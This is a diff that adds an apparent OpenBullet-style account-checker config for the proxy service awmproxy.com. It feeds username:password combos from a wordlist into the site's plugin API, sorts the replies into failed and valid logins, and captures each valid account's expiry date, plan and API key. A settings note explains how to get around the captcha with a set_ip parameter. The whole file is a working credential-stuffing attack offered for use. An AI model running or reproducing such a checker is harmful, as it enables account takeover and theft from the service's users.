@@ -1,0 +1,42 @@
+[SETTINGS]
+{
+  "Name": "awmproxy.net",
+  "SuggestedBots": 1,
+  "LastModified": "2018-09-29T14:55:21.9881552+00:00",
+  "AdditionalInfo": "use the url from captcha with param ?set_ip= and your ip, no need to log in",
+  "Author": "soot",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#REQUEST2 REQUEST GET "https://awmproxy.com/plugin_api.php?login=<USER>&password=<PASS>&set_ip=74.125.232.238" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Requested-By: XMLHttpRequest" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Authorization error" 
+  KEYCHAIN Success OR 
+    KEY "username" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "" 
+PARSE "<SOURCE>" JSON "Exp date" Recursive=FALSE -> CAP "date_expired" "" "" 
+PARSE "<SOURCE>" JSON "tariff" Recursive=FALSE -> CAP "Plan" "" "" 
+PARSE "<SOURCE>" JSON "url" Recursive=FALSE -> CAP "apiKey" "" "" 
